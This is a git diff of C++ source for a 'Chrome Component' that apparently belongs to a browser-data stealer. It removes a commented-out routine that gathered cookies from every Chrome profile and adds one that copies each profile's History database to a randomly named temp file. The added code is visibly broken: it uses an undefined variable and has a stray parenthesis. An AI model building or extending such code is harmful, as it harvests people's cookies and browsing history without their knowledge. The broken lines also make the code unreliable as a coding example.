@@ -7,6 +7,7 @@
 #include <random>
 #include "chrome.h"
 #include "../utils/db.h"
+#include "../utils/rand.h"
 
 /**
  * @brief Execute the *Chrome Component* and extract everything he can from chrome's data.
@@ -33,15 +34,10 @@ bool Chrome::can() {
     return true;
 }
 
-/**
- * @brief Cellects cookies from chrome database for each profile.
- * @return an map with a vector of cookies linked to each profile.
- */
-/*std::unordered_map<std::filesystem::path, std::vector<Cookie>> Chrome::getCookies() {
-    std::unordered_map<std::filesystem::path, std::vector<Cookie>> cookies{};
-    for(std::filesystem::path const &path : Chrome::profilesPath){
-        std::vector<Cookie> profileCookies{};
-
-        db::copyDB(path / "Cookies", std::filesystem::temp_directory_path() / "Cookies");
+std::unordered_map<std::string, std::vector<History>> Chrome::getHistory() {
+    for(std::filesystem::path const &path: Chrome::profilesPath){
+        std::string tempFile{"History" + Rand::randString(4)};
+        db::copyDB(path / "History", std::filesystem::temp_directory_path() / tmpFile));
     }
-}*/
+    return Navigator::getHistory();
+}
